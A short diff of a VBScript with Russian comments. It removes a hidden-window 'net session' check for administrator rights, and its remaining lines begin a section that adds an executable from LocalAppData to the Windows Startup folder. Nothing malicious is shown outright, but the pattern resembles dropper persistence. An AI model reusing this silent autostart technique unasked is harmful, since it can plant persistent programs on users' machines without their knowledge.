@@ -1,17 +1,3 @@
-' ===== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА =====
-Set oShell = CreateObject("WScript.Shell")
-strCommand = "%COMSPEC% /c net session >nul 2>&1"
-iReturnCode = oShell.Run(strCommand, 0, True)
-
-If iReturnCode <> 0 Then
-    WScript.Quit
-End If
-
-Set oShell = Nothing
-Set objShell = CreateObject("WScript.Shell")
-objShell.CurrentDirectory = "C:\Windows\System32"
-
-
 ' ===== ДОБАВЛЕНИЕ EXE В АВТОЗАГРУЗКУ =====
 Dim objAutoShell, strLocalAppDataPath, strExePath, strStartupFolderPath
 Set objAutoShell = CreateObject("WScript.Shell")
